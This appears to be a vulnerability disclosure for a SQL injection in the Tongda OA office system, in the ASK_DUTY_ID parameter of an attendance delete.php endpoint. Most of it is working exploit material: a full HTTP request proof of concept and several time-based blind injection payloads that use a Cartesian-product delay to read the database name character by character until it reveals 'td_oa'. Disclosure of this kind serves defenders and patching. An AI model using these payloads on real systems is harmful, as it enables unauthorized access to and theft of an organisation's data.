SQL injection vulnerability exists in Tongda OA

1.Route: /general/attendance/manage/ask_duty/delete.php
There is an injected parameter: $ASK_DUTY_ID
The code here is very concise. When $ASK_DUTY_ID is not empty, the parameters are directly spliced ​​into the SQL statement. Since the brackets are closed here, there is a bypass.

![image](https://github.com/b51s77/cve/assets/50482841/f30d25bc-a29d-46e4-a8ba-1fdbd6847a84)

POC

```
GET /general/attendance/manage/ask_duty/delete.php?ASK_DUTY_ID=1)%20and%20(substr(DATABASE(),1,1))=char(116)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1 HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: USER_NAME_COOKIE=admin; SID_1=18d621c5; OA_USER_ID=admin; PHPSESSID=slp3nuad96tlfu38tksf1rk9f0
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
```

2.We can use Cartesian product blind injection for injection. The following payload can determine that the first character of the database name is t, because it was successfully delayed at 116. The ASCII code 116 also corresponds to the lowercase letter t. By analogy, the database name and any information about the database can be obtained through blind injection.

```
1)%20and%20(substr(DATABASE(),1,1))=char(116)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
```

![image](https://github.com/b51s77/cve/assets/50482841/5b03f0b8-7c2d-4bd6-b050-2f758cdfbd43)

Intercept the second digit of the database through blind injection, and determine the second digit as the letter d through the delay time

```
1)%20and%20(substr(DATABASE(),2,1))=char(100)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
```
![image](https://github.com/b51s77/cve/assets/50482841/6353bf5a-f7ff-4bee-843d-c2876dc2206b)

The third digit is the character _

```
1)%20and%20(substr(DATABASE(),3,1))=char(95)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
```

![image](https://github.com/b51s77/cve/assets/50482841/a3303143-b99b-49b1-862f-69945a458c0b)

The fourth digit is the character o

```
1)%20and%20(substr(DATABASE(),4,1))=char(111)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
```

![image](https://github.com/b51s77/cve/assets/50482841/1ecebe09-4618-4e6f-8436-c3b7afd7824c)
The fifth digit is the character a

```
1)%20and%20(substr(DATABASE(),5,1))=char(97)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
```
![image](https://github.com/b51s77/cve/assets/50482841/a5d4174c-e24c-4f40-b90b-286f9eba38c7)

Then through blind injection, you can determine that the database name is: td_oa

